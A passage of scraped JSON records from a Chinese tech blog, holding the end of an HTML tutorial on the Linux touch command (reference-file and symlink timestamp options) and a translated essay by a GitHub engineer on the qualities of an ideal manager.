class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Gid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d2b831141767-6\"><span class=\"crayon-v\">Context</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unconfined_u</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">object_r</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">admin_home_t</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">s0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2b831141767-7\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2010</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">02</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">07</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">15</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">12.000000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">0530</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d2b831141767-8\"><span class=\"crayon-v\">Modify</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2010</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">02</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">07</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">15</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">12.000000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">0530</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2b831141767-9\"><span class=\"crayon-v\">Change</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">31.584000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">0530</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d2b831141767-10\"> <span class=\"crayon-v\">Birth</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2b831141767-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p><strong>注意：</strong>在上述命令中，如果我们不指定 <code>-c</code>，如果系统中不存在该文件那么 <code>touch</code> 命令将创建一个新文件，并将时间戳设置为命令中给出的。</p>\n<h3 id=\"toc_7\">示例：8 使用参考文件设置时间戳（-r）</h3>\n<p>在 <code>touch</code> 命令中，我们可以使用参考文件来设置文件或目录的时间戳。假设我想在 <code>devops.txt</code> 文件上设置与文件 <code>sysadm-20.txt</code> 文件相同的时间戳，<code>touch</code> 命令中使用 <code>-r</code> 选项可以轻松实现。</p>\n<p><strong>语法：</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d2f723755501\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# touch -r {参考文件} 真正文件\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d2f723755501-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d2f723755501-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d2f723755501-1\"><span class=\"crayon-p\"># touch -r {参考文件} 真正文件</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d2f723755501-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d32216022158\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -r sysadm-20.txt devops.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d32216022158-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d32216022158-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d32216022158-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -r sysadm-20.txt devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d32216022158-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">示例：9 在符号链接文件上更改访问和修改时间</h3>\n<p>默认情况下，每当我们尝试使用 <code>touch</code> 命令更改符号链接文件的时间戳时，它只会更改原始文件的时间戳。如果你想更改符号链接文件的时间戳，则可以使用 <code>touch</code> 命令中的 <code>-h</code> 选项来实现。</p>\n<p><strong>语法：</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d35139862173\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# touch -h {符号链接文件}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d35139862173-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d35139862173-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d35139862173-1\"><span class=\"crayon-p\"># touch -h {符号链接文件}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d35139862173-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d38205737301\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi opt]# ls -l /root/linuxgeeks.txt\r\nlrwxrwxrwx. 1 root root 15 Mar 30 10:56 /root/linuxgeeks.txt -&gt; linuxadmins.txt\r\n[root@linuxtechi ~]# touch -t 203010191820 -h linuxgeeks.txt\r\n[root@linuxtechi ~]# ls -l linuxgeeks.txt\r\nlrwxrwxrwx. 1 root root 15 Oct 19  2030 linuxgeeks.txt -&gt; linuxadmins.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d38205737301-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d38205737301-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d38205737301-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d38205737301-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d38205737301-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d38205737301-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d38205737301-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">linuxtechi </span><span class=\"crayon-v\">opt</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls -l /root/linuxgeeks.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d38205737301-2\"><span class=\"crayon-v\">lrwxrwxrwx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">56</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">linuxgeeks</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">linuxadmins</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d38205737301-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -t 203010191820 -h linuxgeeks.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d38205737301-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls -l linuxgeeks.txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d38205737301-5\"><span class=\"crayon-v\">lrwxrwxrwx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Oct</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2030</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">linuxgeeks</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">linuxadmins</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d38205737301-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>这就是本教程的全部了。我希望这些例子能帮助你理解 <code>touch</code> 命令。请分享你的宝贵意见和评论。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113946\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113946votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113946\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113946/", "url_obj_id": "766014fa163647d49d5408eaf8fada6b"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2012/07/20120717_161512_1.jpg"], "title": "GitHub 工程师：我眼中的理想上司是这样子的", "create_date": "2018/05/09 ·", "praise_num": 1, "fav_num": 3, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/@keavy/who-i-want-to-work-for-b04ce972c202\">Keavy</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>我是 Github 的一名高级工程师。我不是要找工作，只是一直在思考领导能力的问题，思考在我多年共事过的诸多领导之中，我最欣赏的特质是什么。受到 Chad Fowler 的文章《<a href=\"http://chadfowler.com/2013/04/09/who-i-want-to-hire.html\">我想雇什么样的员工</a>》的启发，我也开始留意我想为什么样的领导工作，即——理想的领导是什么样。</p>\n<p><img class=\"alignnone size-full wp-image-23922\" src=\"http://jbcdn2.b0.upaiyun.com/2012/07/20120717_161512_1.jpg\" alt=\"GitHub：代码是程序员沟通最直接的手段\"></p>\n<p>在分享我的看法之前，先让我简单介绍一下我自己的情况：</p>\n<p>我是一名经验丰富的工程师，做过很多基础架构的工作，同时在我的专业领域（API 及其生态环境）扮演着技术顾问的角色。我是个不太需要监督指导的人，我老板只要指出问题的大方向，就可以放手让我去完成了。我很乐意解决困难的工程问题，带领团队朝一个方向努力，或是帮助公司与公众就一个项目进行沟通。正如一个同事所言：我就是“擅长搞定麻烦事”。</p>\n<p><strong>以下是我认为作为一个理想的领导者应有的特质：</strong></p>\n<ul>\n<li>在工作中明显地表现出冷静和自在，了解你的态度和行为会对周围的人产生哪些影响，非常关注如何营造出一种相互支持的工作环境。</li>\n</ul>\n<ul>\n<li>工作是生活的一部分，拥有健康的工作时间，会休假。即使你自己选择在常规工作时间以外工作，也不期待别人和你一样，不干扰其他人的工作习惯。</li>\n</ul>\n<ul>\n<li>无论与谁谈话都在场。</li>\n</ul>\n<ul>\n<li>善于倾听。</li>\n</ul>\n<ul>\n<li>基于自己和团队的价值，会经过深思熟虑精心设计工作流程，因为你重视他人的参与和时间，因此不会为了走流程而增加流程。</li>\n</ul>\n<ul>\n<li>当你要提出批评性的建议的时候，会及时并且私下沟通。会提供具体的细节，并给出改进的建议和所需的支持。当你有积极的反馈意见时，也会提供具体的细节，并以别人喜欢被认可的方式分享出来。</li>\n</ul>\n<ul>\n<li>足够自信，乐于接受其他人对你工作和方法的反馈。足够谦虚，在你有不懂的时候、犯错的时候或是学到新东西的时候随时承认。享受从周围人身上学习新知识的过程。</li>\n</ul>\n<ul>\n<li>对公司的情况有深刻透彻的理解，利用已知的信息指导员工如何工作可以创造出最大的价值，为用户和公司带来最好的影响。</li>\n</ul>\n<ul>\n<li>不害怕质疑和否认自己的领导，或是挑战公司的现状。</li>\n</ul>\n<ul>\n<li>允许并支持你的员工在划定的范围内自己做决定，即使你可能不会做同样的决定。</li>\n</ul>\n<ul>\n<li>无论是大型还是小型的任务、新特性还是常规维护，重视他人的工作。经常强调这一点，让每个人都知道你重视他和他的工作成果。无论在何时何地都能培养一种信任的文化。</li>\n</ul>\n<ul>\n<li>能够意识到使没受重视的人群被边缘化的行为，即使这些行为是微不足道的，也可能是出于潜意识的。意识到这些事所造成的情感上的伤害。当这种情况出现时，能迅速采取行动解决问题。</li>\n</ul>\n<ul>\n<li>知道科技领域实际上并不是精英政治（根据个人才能和功绩分配权力），多留意在工作中谁创造了最多的价值，谁最积极主动，确保他们受到关注，拥有更多特权。同样，留意谁在工作中遇到了困难，努力纠正其中的不平等。</li>\n</ul>\n<ul>\n<li>观察大家在日常沟通和正式场合谈论事情有何不同。知道存在对女性和有色人种的系统性偏见，努力保证你的员工在相处和评估时不受到此类歧视。</li>\n</ul>\n<ul>\n<li>利用自己的特权帮助员工成长，积极赞助员工：使他们融入团队，看到他们的努力，让他们得到提拔。</li>\n</ul>\n<ul>\n<li>不只是期待员工做出最完美的工作，还要信任并赋予他们做好工作的权力。给予员工接受并完成新挑战所需的支持。</li>\n</ul>\n<ul>\n<li>不接受平庸。如果你尽了最大的努力，但是员工还是滥竽充数，那他们必须离开。</li>\n</ul>\n<ul>\n<li>尽管承担着很多责任和利益相关，仍然着眼于如何让员工更轻松地产出最佳工作成果。</li>\n</ul>\n<ul>\n<li>能注意到有人在工作中感到沮丧、无聊或是很吃力。无论他们主动告诉你的还是你感觉到的，抽出点时间关心他们，倾听其中的原因。</li>\n</ul>\n<p>从我的观点来看，以上这些都很重要。</p>\n<p>如果我描述的这些你都符合，我想你会成为一个好榜样，培养出一个互相支持，态度积极而又忠诚的团队。你能让员工的生活变得更好，理由很简单，你真正地关心着你的员工。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/07/acb658caeaa7401d5d7d20f28a1eab52.png\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113956\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113956votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113956\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">刘唱</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/5f17a18404975a50e3a341f2f8e27d59.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            数据挖掘研究生        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/liuchang\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/liuchang/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" 